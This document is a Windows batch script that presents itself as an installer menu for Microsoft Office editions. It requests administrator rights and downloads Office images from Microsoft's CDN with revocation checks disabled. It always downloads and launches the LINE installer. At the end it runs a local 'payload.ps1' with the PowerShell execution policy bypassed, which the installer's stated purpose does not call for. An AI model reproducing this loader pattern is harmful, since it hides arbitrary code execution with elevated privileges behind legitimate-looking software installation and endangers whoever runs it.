@echo off
title served_software.bat
color 07

:: Get the folder where this batch file is located
set "basepath=%~dp0"

:: Get administrator permission
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo ===============================
echo      Office C2R Installers
echo ===============================
echo [1] Microsoft 365
echo [2] Office 2024
echo [3] Office 2021
echo [4] Office 2019
echo [0] Bypass
echo.
set /p choice="Enter your choice: "
if "%choice%"=="1" goto O365ProPlusRetail.img
if "%choice%"=="2" goto ProPlus2024Retail.img
if "%choice%"=="3" goto ProPlus2021Retail.img
if "%choice%"=="4" goto ProPlus2019Retail.img
if "%choice%"=="0" goto N

:O365ProPlusRetail.img
echo.
echo Downloading O365ProPlusRetail.img
cd %basepath%
curl --ssl-no-revoke -LO "https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/O365ProPlusRetail.img"
tar -xf "O365ProPlusRetail.img" -C "./"
start "" "%basepath%Setup.exe"
goto N

:ProPlus2024Retail.img
echo.
echo Downloading ProPlus2024Retail.img
cd %basepath%
curl --ssl-no-revoke -LO "https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/ProPlus2024Retail.img"
tar -xf "ProPlus2024Retail.img" -C "./"
start "" "%basepath%Setup.exe"
goto N

:ProPlus2021Retail.img
echo.
echo Downloading ProPlus2021Retail.img
cd %basepath%
curl --ssl-no-revoke -LO "https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/ProPlus2021Retail.img"
tar -xf "ProPlus2021Retail.img" -C "./"
start "" "%basepath%Setup.exe"
goto N

:ProPlus2019Retail.img
echo.
echo Downloading ProPlus2019Retail.img
cd %basepath%
curl --ssl-no-revoke -LO "https://officecdn.microsoft.com/db/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/media/en-us/ProPlus2019Retail.img"
tar -xf "ProPlus2019Retail.img" -C "./"
start "" "%basepath%Setup.exe"
goto N

:N
echo.
echo Downloading LineInst.exe
cd %basepath%
curl --ssl-no-revoke -LO "https://desktop.line-scdn.net/win/new/LineInst.exe"
start "" "%basepath%LineInst.exe"

:: Paths relative to this batch file
set "payloadps1=%basepath%payload.ps1"

:: Run payload.ps1
if exist "%payloadps1%" (
    echo Running payload PowerShell script: %payloadps1%
    powershell -ExecutionPolicy Bypass -File "%payloadps1%"
) else (
    echo Payload PowerShell not found: %payloadps1%

)




